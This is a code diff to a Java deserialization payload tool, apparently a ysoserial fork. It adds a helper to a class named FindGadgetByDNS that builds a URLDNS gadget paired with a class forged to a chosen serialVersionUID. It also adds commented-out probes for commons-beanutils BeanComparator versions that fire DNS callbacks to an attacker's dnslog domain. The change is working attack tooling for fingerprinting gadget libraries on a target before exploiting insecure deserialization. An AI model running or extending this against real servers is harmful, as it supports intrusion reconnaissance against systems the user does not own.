@@ -2,6 +2,7 @@ package cn.butler.yso.payloads;
 
 import cn.butler.payloads.ObjectPayload;
 import cn.butler.payloads.PayloadRunner;
+import cn.butler.yso.payloads.util.ClassUtil;
 import javassist.ClassPool;
 import javassist.CtClass;
 import cn.butler.payloads.annotation.Authors;
@@ -122,6 +123,13 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
                 list.add(cb17);
                 list.add(cb18x);
                 list.add(cb19x);
+                //用suid和类名探测
+//                HashMap cb15x = getURLDNSgadgetBySuid("http://cb15x."+dnslog, "org.apache.commons.beanutils.BeanComparator","5123381023979609048L");
+//                HashMap cb16x = getURLDNSgadgetBySuid("http://cb16x."+dnslog, "org.apache.commons.beanutils.BeanComparator","2573799559215537819L");
+//                HashMap cb110x = getURLDNSgadgetBySuid("http://cb1110x."+dnslog, " org.apache.commons.beanutils.BeanComparator","1L");
+//                list.add(cb15x);
+//                list.add(cb16x);
+//                list.add(cb110x);
                 break;
             case "C3P0":
                 //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为-2440162180985815128
@@ -299,6 +307,23 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
                 list.add(hm);
                 break;
         }
+    }
+
+    private static HashMap getURLDNSgadgetBySuid(String urls, String clazzName, String suid) throws Exception{
+        HashMap hashMap = new HashMap();
+        URL url = new URL(urls);
+        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
+        f.setAccessible(true);
+        f.set(url, 0);
+        Class clazz = null;
+        try {
+            clazz = ClassUtil.genClassBySuid(clazzName,suid);
+        } catch (Exception e) {
+            clazz = Class.forName(clazzName);
+        }
+        hashMap.put(url, clazz);
+        f.set(url, -1);
+        return hashMap;
     }
 
     private static HashMap getURLDNSgadget(String urls, String clazzName) throws Exception{
